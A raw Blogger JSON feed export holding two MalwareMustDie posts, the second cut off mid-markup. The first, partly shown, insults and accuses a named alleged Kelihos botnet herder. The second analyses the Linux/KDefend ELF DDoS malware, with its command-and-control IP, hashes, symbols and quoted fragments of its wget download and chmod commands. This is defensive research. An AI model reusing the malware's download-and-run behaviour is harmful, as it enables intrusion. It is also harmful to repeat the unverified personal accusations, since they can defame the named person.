\u003Cp\u003EThis post is as a new additional \"sin\" for ↓\u003Cb\u003E\u003Ci\u003Ethis cyber crook\u003C\/i\u003E\u003C\/b\u003E↓ against our internet services. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1kaWQWWIB_k\/VnfiCbriXZI\/AAAAAAAAT54\/40jjJakyJho\/s4120\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1kaWQWWIB_k\/VnfiCbriXZI\/AAAAAAAAT54\/40jjJakyJho\/s520\/011.png\u003E\u003C\/a\u003E\u003C!----img src=https:\/\/lh4.googleusercontent.com\/-6pYWppi3INc\/UqdWWMgoESI\/AAAAAAAAN7k\/hrOYKI6Ih_8\/s395\/B1001100100.jpg----\u003E\u003Cbr\u003E\u003Ci\u003EOnly a \u003Cb\u003Estupid fool\u003C\/b\u003E like ↑this herder makes same mistakes over and over.\u003C\/i\u003E\u003Cbr\u003E \u003Cp\u003EIf you want to see a \u003Ci\u003Esolid proof\u003C\/i\u003E that what so called \"\u003Cb\u003EPetr Severa\u003C\/b\u003E\" is the herder of \u003Ci\u003EKelihos botnet\u003C\/i\u003E, please watch the \u003Ci\u003E\u003Cb\u003Eslides \u003C\/b\u003E\u003C\/i\u003Eand \u003Cb\u003E\u003Ci\u003Evideo\u003C\/i\u003E\u003C\/b\u003E for our \u003Ci\u003EBotConf presentation in 2013 \u003C\/i\u003Eposted in \u003Cb\u003E\u003Ci\u003EBotConf Website\u003C\/i\u003E\u003C\/b\u003E [\u003Ca href=\"http:\/\/www.botconf.eu\"\u003Elink\u003C\/a\u003E].  \u003Cp\u003E\u003Ch2\u003EPOC OF CORRECT INVESTIGATION :-)\u003Cbr\u003EThe botherder closed the CNC 2 dedicated servers with its 10 IP addresses in USA that we disclosed in this post - #MalwareMustDie *SMACKED* Severa (again!)\u003C\/h2\u003E \u003Cp\u003EIf you have doubt of any truth stated in this post, see yourself the reaction of the botherder after we released this disclosure, the botherder had closed the account of the dedicated servers mentioned in this post (it was much more viewable before the censorship request received) in December 2015 after the original post was published online. Some PoC of this paragraph is the information below:\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/F6MeN9NsGCs?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E\u003Cbr\u003EThis herder is a Russian national, a known cyber crime actor resides in Russia Federation's St. Petersburg,  and he is still out there lurking all of us with his botnet which is actively malvertised its initial infection for expansion purpose via a known Exploit Kit, and affiliated in several malware campaign distribution until today. We, reported his positive real identification and evidence of his crime records since 2013, and he is still out there \"untouchable by law\", controlling his botnet and making illegal money from it. From now on, in every new years to come, if he is still operated freely, we will disclose deeper and deeper details of the actor's threat + infrastructure he has, and we won't stop until he stopped or be stopped. It's a promise.  \u003Cp\u003EFor people who says we are vigilante, we're not the bad guys, he is. We're asking for a crime to be stopped, by law we believed in. Until the law is preserved against this asshole, we will keep on disturbing him.  \u003Cp\u003E#MalwareMustDie!  \u003Ci\u003E\u003Cp\u003E\u003Cpre\u003E\u003Cbr \/\u003E* * * Psalm 139 - God Knows Everything * * *\u003Cbr \/\u003E\u003Cbr \/\u003E139 Lord, you have examined me\u003Cbr \/\u003E    and know all about me.\u003Cbr \/\u003E2 \u003Cbr \/\u003EYou know when I sit down and when I get up.\u003Cbr \/\u003E    You know my thoughts before I think them.\u003Cbr \/\u003E3 \u003Cbr \/\u003EYou know where I go and where I lie down.\u003Cbr \/\u003E    You know everything I do.\u003Cbr \/\u003E4 \u003Cbr \/\u003ELord, even before I say a word,\u003Cbr \/\u003E    you already know it.\u003Cbr \/\u003E5 \u003Cbr \/\u003EYou are all around me in front and in back\u003Cbr \/\u003E    and have put your hand on me.\u003Cbr \/\u003E6 \u003Cbr \/\u003EYour knowledge is amazing to me;\u003Cbr \/\u003E    it is more than I can understand.\u003Cbr \/\u003E7 \u003Cbr \/\u003EWhere can I go to get away from your Spirit?\u003Cbr \/\u003E    Where can I run from you?\u003Cbr \/\u003E8 \u003Cbr \/\u003EIf I go up to the heavens, you are there.\u003Cbr \/\u003E    If I lie down in the grave, you are there.\u003Cbr \/\u003E9 \u003Cbr \/\u003EIf I rise with the sun in the east\u003Cbr \/\u003E    and settle in the west beyond the sea,\u003Cbr \/\u003E10 \u003Cbr \/\u003Eeven there you would guide me.\u003Cbr \/\u003E    With your right hand you would hold me.\u003Cbr \/\u003E11 \u003Cbr \/\u003EI could say, “The darkness will hide me.\u003Cbr \/\u003E    Let the light around me turn into night.”\u003Cbr \/\u003E12 \u003Cbr \/\u003EBut even the darkness is not dark to you.\u003Cbr \/\u003E    The night is as light as the day;\u003Cbr \/\u003E    darkness and light are the same to you.\u003Cbr \/\u003E13 \u003Cbr \/\u003EYou made my whole being;\u003Cbr \/\u003E    you formed me in my mother’s body.\u003Cbr \/\u003E14 \u003Cbr \/\u003EI praise you because you made me in an amazing and wonderful way.\u003Cbr \/\u003E    What you have done is wonderful.\u003Cbr \/\u003E    I know this very well.\u003Cbr \/\u003E15 \u003Cbr \/\u003EYou saw my bones being formed\u003Cbr \/\u003E    as I took shape in my mother’s body.\u003Cbr \/\u003EWhen I was put together there,\u003Cbr \/\u003E16 \u003Cbr \/\u003Eyou saw my body as it was formed.\u003Cbr \/\u003EAll the days planned for me\u003Cbr \/\u003E    were written in your book\u003Cbr \/\u003E    before I was one day old.\u003Cbr \/\u003E17 \u003Cbr \/\u003EGod, your thoughts are precious to me.\u003Cbr \/\u003E    They are so many!\u003Cbr \/\u003E18 \u003Cbr \/\u003EIf I could count them,\u003Cbr \/\u003E    they would be more than all the grains of sand.\u003Cbr \/\u003EWhen I wake up,\u003Cbr \/\u003E    I am still with you.\u003Cbr \/\u003E19 \u003Cbr \/\u003EGod, I wish you would kill the wicked!\u003Cbr \/\u003E    Get away from me, you murderers!\u003Cbr \/\u003E20 \u003Cbr \/\u003EThey say evil things about you.\u003Cbr \/\u003E    Your enemies use your name thoughtlessly.\u003Cbr \/\u003E21 \u003Cbr \/\u003ELord, I hate those who hate you;\u003Cbr \/\u003E    I hate those who rise up against you.\u003Cbr \/\u003E22 \u003Cbr \/\u003EI feel only hate for them;\u003Cbr \/\u003E    they are my enemies.\u003Cbr \/\u003E23 \u003Cbr \/\u003EGod, examine me and know my heart;\u003Cbr \/\u003E    test me and know my anxious thoughts.\u003Cbr \/\u003E24 \u003Cbr \/\u003ESee if there is any bad thing in me.\u003Cbr \/\u003E    Lead me on the road to everlasting life.\u003Cbr \/\u003E\u003Cbr \/\u003E\u003C\/pre\u003E\u003C\/i\u003E\u003Cp\u003E#MalwareMustDie! \u003C!-- link rel=\"xmlrpc pingback\" href=\"http:\/\/goo.gl\/oK0gPz\" \/ ---\u003E"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/2960441158452306538\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/12\/mmd-0046-2015-kelihos-cnc-activity-on.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/2960441158452306538"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/2960441158452306538"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/12\/mmd-0046-2015-kelihos-cnc-activity-on.html","title":"MMD-0046-2015 - Cyber crime: Kelihos 10 nodes CNC on NJIIX, New Jersey USA, with a known russian crook who rented them"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-1kaWQWWIB_k\/VnfiCbriXZI\/AAAAAAAAT54\/40jjJakyJho\/s72-c\/011.png","height":"72","width":"72"},"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-3192282181194922209"},"published":{"$t":"2015-12-03T13:44:00.000-08:00"},"updated":{"$t":"2015-12-05T04:59:14.254-08:00"},"title":{"type":"text","$t":"MMD-0045-2015 - KDefend: a new ELF threat with a disclaimer"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003EIt's been a while not writing new analysis in our blog \u0026 this timing is just perfect.\u003Cbr\u003E  On December 1st, 2015 this sample was detected by our ELF team member \u003Cb\u003E@benkow_\u003C\/b\u003E\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-sMLW8mFOZdY\/VmBtpn-SUgI\/AAAAAAAATxY\/ePxGD3xHpNk\/h63\/000.png\u003E\u003Cbr\u003E..and our ELF Team started to investigate the threat and come into conclusion that another new ELF malware was spotted, and post this is the report. It was calling itself \u003Ci\u003E\u003Cb\u003E\"KDefend\"\u003C\/b\u003E\u003C\/i\u003E or \u003Cb\u003E\u003Ci\u003E\"KDLinux\"\u003C\/i\u003E\u003C\/b\u003E, so we call it as \u003Cb\u003E\"Linux\/KDefend\"\u003C\/b\u003E then. We separate some tasks in members in this report, and will cover to highlights of this new malware hopefully will help others in tracking and mitigating the threat for the future.　I will do the ELF binary analysis to figure what kind of threat it is, with some pointer hint in my analysis that hopefully can be useful for fellow \u003Ci\u003EUNIX sysadmins\u003C\/i\u003E and malware researchers.  \u003Cp\u003E\u003Ch2\u003EThe KDefend; How does it look like?\u003C\/h2\u003E \u003Cp\u003EIt is a bit unusual to our post, but I decided to write the behaviour part first this time for you to see the fact that we would like to stress in this new malware finding.  \u003Cbr\u003EThe binary is in here --\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/c33e2ad0c98f333f901dbaa489dc1b41237b4824ab1d1e5fe403ef7d3f058d7c\/analysis\/1448956884\/\"\u003Evirustotal\u003C\/a\u003E] with the below status: \u003Cpre class=\"brush: asm\"\u003E[0x08049880]\u003E !file task\u003Cbr \/\u003Etask: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, \u003Cbr \/\u003E      interpreter \/lib\/ld-linux.so.2, for GNU\/Linux 2.6.9, not stripped\u003Cbr \/\u003E[0x08049880]\u003E !md5 task\u003Cbr \/\u003EMD5 (task) = f93d664aac485af82ec863c251626441\u003Cbr \/\u003E[0x08049880]\u003E !size task\u003Cbr \/\u003E   text    data     bss     dec     hex filename\u003Cbr \/\u003E  44871    1396  772660  818927   c7eef task\u003C\/pre\u003E Upon execution it will show a nice logo:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-czRbJviqXSM\/VmByUhZf_KI\/AAAAAAAATxk\/VrcuxWrG0fM\/s2580\/001a.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-czRbJviqXSM\/VmByUhZf_KI\/AAAAAAAATxk\/VrcuxWrG0fM\/s580\/001a.png\u003E\u003C\/a\u003E\u003Cbr\u003EPlease don't mind my shell's language \u0026 character setting is just unmatched to original encoding and caused the garbled result in the screenshot, it's not a problem. With a good team work (thank's to @wirehack7 for good chinese decoding tip) I reversed the function that printed and decoded the characters used to show the original chinese language used, and then we also \u003Ci\u003E\"free-translated\"\u003C\/i\u003E it too as per below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-6CkON5ZrVII\/VmBznwZS3BI\/AAAAAAAATxs\/umOTlqyk2yU\/s3120\/002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-6CkON5ZrVII\/VmBznwZS3BI\/AAAAAAAATxs\/umOTlqyk2yU\/s580\/002.PNG\u003E\u003C\/a\u003E\u003Cbr\u003ESo now you see.. here it is, that message in the logo is our other main topic for today, we have a new malware pretending as a stress tool and having a \"\u003Cb\u003Edisclaimer message\"\u003C\/b\u003E as per shown above.\u003Cbr\u003E  \u003Ci\u003E*) Noted: the translation was a free translation level, feel free to help in correcting it. Thanks!\u003C\/i\u003E \u003Cp\u003E\u003Ch2\u003EHow does the infection (attacker, panel and CNC) go?\u003C\/h2\u003E \u003Cp\u003EWell okay, first, let's see if this so called \u003Cb\u003E\u003Ci\u003E\"stress tool\"\u003C\/i\u003E\u003C\/b\u003E was being used as per what its disclaimer said... \u003Cb\u003EWhich is unfortunately not\u003C\/b\u003E. It was found in action during its effort to infect a linux server with the SSH brute access as per logged below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-n7ZAj1RvAYk\/VmB1f33QgbI\/AAAAAAAATx4\/1ncnJpIeiLA\/s3400\/002a.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-n7ZAj1RvAYk\/VmB1f33QgbI\/AAAAAAAATx4\/1ncnJpIeiLA\/s580\/002a.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe attacker IP \u0026 download panel IP is all 60.190.216.225 and it looks like the CNC is set to same IP too:  \u003Cpre class=\"brush: asm\"\u003EConnecting to 60.190.216.225 8090..\u003Cbr \/\u003Eunknown [60.190.216.225] 8090 open\u003Cbr \/\u003EConnection to 60.190.216.225 8090 port [tcp\/*] succeeded!\u003Cbr \/\u003EMMD-LOVE-ELF-\u003E60.190.216.225:8090 (ESTABLISHED)\u003C\/pre\u003Eit's showing the location somewhere in PRC\/China: \u003Cpre class=\"brush: asm\"\u003E[0x08049880]\u003E !ipchk geo 60.190.216.225\u003Cbr \/\u003E-----------------------------------------------------------\u003Cbr \/\u003Eipchk-shell 1.5 FreeBSD version - by @unixfreaxjp\u003Cbr \/\u003E-----------------------------------------------------------\u003Cbr \/\u003ESource : geo\u003Cbr \/\u003EIP     : 60.190.216.225\u003Cbr \/\u003E-----------------------------------------------------------\u003Cbr \/\u003Egeoip:\u003Cbr \/\u003E{\u003Cbr \/\u003E  \"ip\": \"60.190.216.225\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Shaoxing\",\u003Cbr \/\u003E  \"region\": \"Zhejiang Sheng\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"30.0110,120.5715\",\u003Cbr \/\u003E  \"org\": \"AS4134 No.31,Jin-rong Street\"\u003Cbr \/\u003E}\u003C\/pre\u003ESo this malware was homing to the mothership and sending its initial traffic which is the infected machine's sensitive information like what we recorded here:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-qgnyqhv1KAw\/VmB3-pBsc8I\/AAAAAAAATyE\/697WGXd96GA\/s3120\/001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qgnyqhv1KAw\/VmB3-pBsc8I\/AAAAAAAATyE\/697WGXd96GA\/s580\/001.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E...and it is stated: \u003Ci\u003E\u003Cb\u003E\u003Cpre\u003E     it's prohibited for illegal use\u003Cbr \/\u003E     the author is not responsible  \u003C\/pre\u003E\u003C\/b\u003E\u003C\/i\u003ESweet! :) we can go back to this \"moral issue\" later on. Let's move on first to peel this a bit more..  \u003Cp\u003E\u003Ch2\u003EHow is it built?\u003C\/h2\u003E \u003Cp\u003EBelow is the details on how this malware was built, mind the text format. Please refer to the status of the binary above beforehand. There's nothing so special in it, but it's always good to know these level of information: \u003Cpre class=\"brush: asm\"\u003E\/\/ compiler:\u003Cbr \/\u003E        GCC 3.0\u003Cbr \/\u003E\u003Cbr \/\u003E\/\/ compilation environment:\u003Cbr \/\u003E        GCC: (GNU) 4.1.2 20080704 (Red Hat 4.1.2-44)\u003Cbr \/\u003E\u003Cbr \/\u003E\/\/ linked libraries used\u003Cbr \/\u003E        linux-gate.so.1 =\u003E  (0xb7749000)\u003Cbr \/\u003E        libpthread.so.0 =\u003E \/lib\/i386-linux-gnu\/i686\/cmov\/libpthread.so.0 (0xb7724000)\u003Cbr \/\u003E        libstdc++.so.6 =\u003E \/usr\/lib\/i386-linux-gnu\/libstdc++.so.6 (0xb7638000)\u003Cbr \/\u003E        libm.so.6 =\u003E \/lib\/i386-linux-gnu\/i686\/cmov\/libm.so.6 (0xb7611000)\u003Cbr \/\u003E        libgcc_s.so.1 =\u003E \/lib\/i386-linux-gnu\/libgcc_s.so.1 (0xb75f4000)\u003Cbr \/\u003E        libc.so.6 =\u003E \/lib\/i386-linux-gnu\/i686\/cmov\/libc.so.6 (0xb7490000)\u003Cbr \/\u003E        \/lib\/ld-linux.so.2 (0xb774a000)\u003Cbr \/\u003E\u003Cbr \/\u003E\/\/ first copy of libs listed in ELF 1st image addresses can be found below:\u003Cbr \/\u003E000000000134  \/lib\/ld-linux.so.2\u003Cbr \/\u003E0000000007C5  libpthread.so.0\u003Cbr \/\u003E000000000881  libstdc++.so.6\u003Cbr \/\u003E000000000C5F  libm.so.6\u003Cbr \/\u003E000000000C69  libgcc_s.so.1\u003Cbr \/\u003E000000000C86  libc.so.6\u003Cbr \/\u003E\u003Cbr \/\u003E\/\/ these are the source codes resource:\u003Cbr \/\u003E\u003Cbr \/\u003E---------------------\u003Cbr \/\u003E1. 0x011851   main(.cpp)\u003Cbr \/\u003E---------------------\u003Cbr \/\u003E\u003Cbr \/\u003E---------------------\u003Cbr \/\u003E2. 0x00E641   crtstuff.c \u003Cbr \/\u003E(BE NOTED: This is a GCC constructors\/destructors for C++ obj\/Open Source)\u003Cbr \/\u003E---------------------\u003Cbr \/\u003E*)ref: http:\/\/www.opensource.apple.com\/source\/gcc\/gcc-5488\/gcc\/crtstuff.c\u003Cbr \/\u003E0x00E64C   __CTOR_LIST__\u003Cbr \/\u003E0x00E65A   __DTOR_LIST__\u003Cbr \/\u003E0x00E668   __JCR_LIST__\u003Cbr \/\u003E0x00E675   dtor_idx.5793\u003Cbr \/\u003E0x00E683   completed.5791\u003Cbr \/\u003E0x00E692   __do_global_dtors_aux\u003Cbr \/\u003E0x00E6A8   frame_dummy\u003Cbr \/\u003E0x00E6B4   __CTOR_END__\u003Cbr \/\u003E0x00E6C1   __FRAME_END__\u003Cbr \/\u003E0x00E6CF   __JCR_END__\u003Cbr \/\u003E0x00E6DB   __do_global_ctors_aux\u003Cbr \/\u003E\u003Cbr \/\u003E-------------------------\u003Cbr \/\u003E3. 0x00E6F1   synserv.cpp\u003Cbr \/\u003E-------------------------\u003Cbr \/\u003E0x00E6FD   _GLOBAL__I_dout\u003Cbr \/\u003E0x00E70D   __tcf_6\u003Cbr \/\u003E0x00E715   _Z41__static_initialization_and_destruction_0ii\u003Cbr \/\u003E0x00E745   _ZSt8__ioinit\u003Cbr \/\u003E0x00E753   __tcf_4\u003Cbr \/\u003E0x00E75B   __tcf_5\u003Cbr \/\u003E0x00E763   __tcf_3\u003Cbr \/\u003E0x00E76B   _ZZ12GetTxPpsByIfRKSsiE7s_ticks\u003Cbr \/\u003E0x00E78B   __tcf_2\u003Cbr \/\u003E0x00E793   _ZZ12GetTxPpsByIfRKSsiE9s_packets\u003Cbr \/\u003E0x00E7B5   __tcf_1\u003Cbr \/\u003E0x00E7BD   _ZZ6GetPPSPciE7s_ticks\u003Cbr \/\u003E0x00E7D4   __tcf_0\u003Cbr \/\u003E0x00E7DC   _ZZ6GetPPSPciE9s_packets\u003Cbr \/\u003E0x00E7F5   _ZZ6GetCpuvE3s_u\u003Cbr \/\u003E0x00E806   _ZZ6GetCpuvE3s_i\u003Cbr \/\u003E0x00E817   _ZZ6GetCpuvE3s_s\u003Cbr \/\u003E0x00E828   _ZZ6GetCpuvE3s_n\u003Cbr \/\u003E0x00E839   _ZGVZ12GetTxPpsByIfRKSsiE9s_packets\u003Cbr \/\u003E0x00E85D   _ZGVZ12GetTxPpsByIfRKSsiE7s_ticks\u003Cbr \/\u003E0x00E87F   _ZGVZ6GetPPSPciE9s_packets\u003Cbr \/\u003E0x00E89A   _ZGVZ6GetPPSPciE7s_ticks\u003Cbr \/\u003E0x00E8B3   _ZGVZ12SendCPUUsagevE9lastConID\u003Cbr \/\u003E0x00E8D3   _ZZ12SendCPUUsagevE9lastConID\u003Cbr \/\u003E0x00E8F1   _ZZ12SendCPUUsagevE14s_lastCpuUsage\u003Cbr \/\u003E\u003Cbr \/\u003E---------------------\u003Cbr \/\u003E4. 0x00E915   syn.cpp\u003Cbr \/\u003E---------------------\u003Cbr \/\u003E0x00E91D   _GLOBAL__I_g_cycleInfo\u003Cbr \/\u003E0x00E934   g_sockArray\u003Cbr \/\u003E0x00E940   g_cycleSynDip\u003Cbr \/\u003E0x00E94E   g_pktsSize\u003Cbr \/\u003E0x00E959   g_pktsBufferQueue\u003Cbr \/\u003E0x00E96B   g_pktsBufferQueueInit\u003Cbr \/\u003E0x00E981   g_lockSockCreation\u003Cbr \/\u003E0x00E994   g_lockSockIdx\u003Cbr \/\u003E0x00E9A2   g_sockIdx\u003Cbr \/\u003E0x00E9AC   __preinit_array_start\u003Cbr \/\u003E0x00E9C2   __fini_array_end\u003Cbr \/\u003E0x00E9D3   _GLOBAL_OFFSET_TABLE_\u003Cbr \/\u003E0x00E9E9   __preinit_array_end\u003Cbr \/\u003E0x00E9FD   __fini_array_start\u003Cbr \/\u003E0x00EA10   __init_array_end\u003Cbr \/\u003E0x00EA21   __init_array_start\u003Cbr \/\u003E0x00EA34   _DYNAMIC\u003Cbr \/\u003E0x00EA3D   data_start\u003C\/pre\u003EI don't know how to comment here..except a unix programming beginner is coding and compiling a \u003Cb\u003E.cpp coded\u003C\/b\u003E malware. It's always good (at least for my research) to know \u003Cb\u003E\u003Ci\u003Ehow\u003C\/i\u003E\u003C\/b\u003E or \u003Cb\u003E\u003Ci\u003Ewhere\u003C\/i\u003E\u003C\/b\u003E the source is and \u003Cb\u003E\u003Ci\u003Ewhat\u003C\/i\u003E\u003C\/b\u003E libraries are used, so we can know exactly where to after our \u003Ci\u003Emalcodes\u003C\/i\u003E. In analysis of a \u003Ci\u003Edynamic linked ELF binary\u003C\/i\u003E, like this case, I used to breakdown each library before start hitting any disassembler to reverse the purpose. \u003Cp\u003EThe short explanation of the libraries used above are: \u003Cbr\u003E\u003Cb\u003E\u003Ci\u003Elinux-gate.so.1\u003C\/i\u003E\u003C\/b\u003E is known as a virtual DSO, a shared object exposed by the kernel at a fixed address in every process' memory.  \u003Cb\u003E\u003Ci\u003Eld-linux.so.2\u003C\/i\u003E\u003C\/b\u003E is a \"locator\" to load the dynamic libraries it needs for execution, it searches for and loads the unresolved libraries, and then it passes control to the application starting point.  \u003Cb\u003E\u003Ci\u003Elibm.so.6\u003C\/i\u003E\u003C\/b\u003E contains functions to mathematical process libs. \u003Cb\u003E\u003Ci\u003Elibpthread.so.0\u003C\/i\u003E\u003C\/b\u003E (POSIX threads) is used for threaded programming, in this code it was used for \u003Ci\u003Esend\u003C\/i\u003E, \u003Ci\u003Econnect\u003C\/i\u003E, \u003Ci\u003Erecvfrom\u003C\/i\u003E, \u003Ci\u003Esendto \u003C\/i\u003Eand its threat connection \u003Ci\u003Emutex\u003C\/i\u003E. \u003Ci\u003E\u003Cb\u003Elibstdc++.so.6\u003C\/b\u003E\u003C\/i\u003E, \u003Ci\u003E\u003Cb\u003Elibgcc_s.so.1\u003C\/b\u003E\u003C\/i\u003E, and \u003Ci\u003E\u003Cb\u003Elibc.so.6\u003C\/b\u003E\u003C\/i\u003E is for cpp and GCC\/libc programming base functions. The leftover ones are mostly the \u003Ci\u003Esource code\u003C\/i\u003E related trails.  \u003Cp\u003E\u003Ch2\u003EWhat does it do? How does it run? A summary..\u003C\/h2\u003E \u003Cp\u003EIt is an explanation on an idea on how it firstly runs. After the loading \u0026 print \"that logo\" data, it starts the daemonized UDP listener \u0026 threading its process to listen into UDP\/52066. So this is \u003Cb\u003E\u003Ci\u003E\u003Cfont color=red\u003Ethe backdoor function number one\u003C\/font\u003E\u003C\/i\u003E\u003C\/b\u003E. Upon failed binding into UDP\/52066 it will retry and upon succeed it will use \u003Cb\u003E\u003Ci\u003E\u003Cfont color=red\u003Eanother backdoor connection\u003C\/font\u003E\u003C\/i\u003E\u003C\/b\u003E to the hard coded CNC IP\/port via \u003Ci\u003E\u003Cb\u003EDDosSock_Init\u003C\/b\u003E\u003C\/i\u003E\/0x0804cb8c (see the ip\/port written in above section), then start to harvest the data of client to be in communication with their mothership (via \u003Cb\u003E\u003Ci\u003EConnectClient\u003C\/i\u003E\u003C\/b\u003E\/0x0804cb9a).\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-9JhrZmq5o5A\/VmCKJvxj4SI\/AAAAAAAATyU\/_oHjvDYv3mQ\/s4120\/002b.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-9JhrZmq5o5A\/VmCKJvxj4SI\/AAAAAAAATyU\/_oHjvDYv3mQ\/s580\/002b.PNG\u003E\u003C\/a\u003E\u003Cbr\u003ENoted the \u003Cb\u003E\u003Ci\u003EUdpLitenThread\u003C\/i\u003E\u003C\/b\u003E typo, it is really a \"Deja Vu\" \u003Ci\u003Etypo\u003C\/i\u003E for a \u003Ci\u003Especific \u003C\/i\u003Eprevious malware case and coder's MO, I will go to that soon..  \u003Cp\u003EFrom above step, it utilized an \"almost generic\" \u003Ci\u003E\u003Cb\u003ECreateConnectSocket\u003C\/b\u003E\u003C\/i\u003E()\/0x0804a3ac for the remote connection, it uses original \u003Ci\u003E\u003Cb\u003EGetSysinfo\u003C\/b\u003E\u003C\/i\u003E() (0x0804A0DE) for information harvest purpose that is responsible for the initial data sent in the pcap captured at above section.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-GpdBAkWqozQ\/VmCKJz_SBdI\/AAAAAAAATyY\/B7_W-X6bvjs\/s5120\/002c.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-GpdBAkWqozQ\/VmCKJz_SBdI\/AAAAAAAATyY\/B7_W-X6bvjs\/s580\/002c.png\u003E\u003C\/a\u003E\u003Cbr\u003EYou'll also see \u003Cb\u003E\u003Ci\u003E\u003Cfont color=red\u003Efurther backdoor functions\u003C\/font\u003E\u003C\/i\u003E\u003C\/b\u003E executed like \u003Ci\u003E\u003Cb\u003ENetPPS \u003C\/b\u003E\u003C\/i\u003Eand \u003Ci\u003E\u003Cb\u003ECPUUsage\u003C\/b\u003E\u003C\/i\u003E will be used to send its \u003Ci\u003Eself-explanatory data\u003C\/i\u003E to the mothership. The \u003Cb\u003Eimportant part is\u003C\/b\u003E, in the \u003Cb\u003E\u003Ci\u003ESendNetPPS()\u003C\/i\u003E\u003C\/b\u003E function you'll see the usage of \u003Cb\u003E\u003Ci\u003E\"ifconfig\"\u003C\/i\u003E\u003C\/b\u003E shell command used for grabbing the transmitted packet data (see in subs \u003Ci\u003E\u003Cb\u003EGetTxPacketsMap\u003C\/b\u003E\u003C\/i\u003E), was executed and \u003Ci\u003Epiped \u003C\/i\u003Ewith \u003Cb\u003E\u003Ci\u003E\"grep\"\u003C\/i\u003E\u003C\/b\u003E for its desired data:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-GdreP3ivXHo\/VmCTWGifB9I\/AAAAAAAATys\/xeuaV07qZn8\/s3400\/002d.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-GdreP3ivXHo\/VmCTWGifB9I\/AAAAAAAATys\/xeuaV07qZn8\/s580\/002d.png\u003E\u003C\/a\u003E\u003Cbr\u003EWell, as you saw in above section, I blocked the \u003Cb\u003E\u003Ci\u003Eifconfig\u003C\/i\u003E\u003C\/b\u003E in the path searched by this malware: \u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-uLCTVKEt9Jc\/VmDiODdHiwI\/AAAAAAAATz4\/XBrFibFR8Jk\/s300\/002h.png\u003E\u003Cbr\u003Eand did you see how the data sent to the CNC? While it can't grep, it seems it doesn't implement the error trapping and the variable names stays there as per it is :) That's why I personally think it's an amateur was hired to make this code, maybe we just have to seek for a youth malcode programmer again for it.  \u003Cp\u003EIt has \u003Cb\u003E\u003Ci\u003Eanother backdoor \u003C\/i\u003E\u003C\/b\u003Etoo like: the \u003Cb\u003Eupdater function\u003C\/b\u003E, it was calling \u003Cb\u003E\u003Ci\u003EDealwithUpdate()\u003C\/i\u003E\u003C\/b\u003E\/0x0804B5EE for getting the updates with kicking another shell command \u003Cb\u003E\u003Ci\u003E\"wget -t3 -O\"\u003C\/i\u003E\u003C\/b\u003E, refer to function \u003Cb\u003E\u003Ci\u003Edownload()\u003C\/i\u003E\u003C\/b\u003E\/0x804b67b: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1Vl1lGS3qpk\/VmCaNpCtSSI\/AAAAAAAATy8\/D3ObN5kFGUE\/s3102\/002e.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1Vl1lGS3qpk\/VmCaNpCtSSI\/AAAAAAAATy8\/D3ObN5kFGUE\/s580\/002e.png\u003E\u003C\/a\u003E\u003Cp\u003EUpon post-downloading, the executable permission is set, using \u003Cb\u003E\u003Ci\u003E\"chmod -R 777\"\u003C\/i\u003E\u003C\/b\u003E for further process:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-NDD0Vc5ydic\/VmCdOsceuOI\/AAAAAAAATzI\/FFPZWAnVUHI\/s3352\/002f.png\"\u003E\u003Cimg 